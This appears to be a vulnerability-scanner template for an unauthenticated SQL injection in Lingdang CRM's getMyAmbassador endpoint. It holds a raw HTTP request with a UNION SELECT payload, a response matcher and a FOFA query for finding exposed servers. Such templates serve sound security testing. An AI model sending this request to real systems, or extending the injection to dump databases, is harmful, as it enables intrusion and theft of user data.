http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - f379eaf3c831b04de153469d1bec345e
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /crm/WeiXinApp/marketing/index.php?module=Ambassador&action=getMyAmbassador HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
          Accept-Encoding: gzip, deflate
          Accept-Language: zh-CN,zh;q=0.9
          Content-Type: application/x-www-form-urlencoded
          Connection: close

          logincrm_userid=-1 union select md5(666666),2,3#
id: lingdangCRM-getMyAmbassador-sql
info:
    author: Superhero
    description: |-
        fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
        灵当CRM getMyAmbassador 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 灵当CRM getMyAmbassador SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/Ag-KF2tbhmaTwyhy5Ph2jQ?token=1386604809&lang=zh_CN
    severity: high
    tags:
        - 灵当CRM
        - jQuery
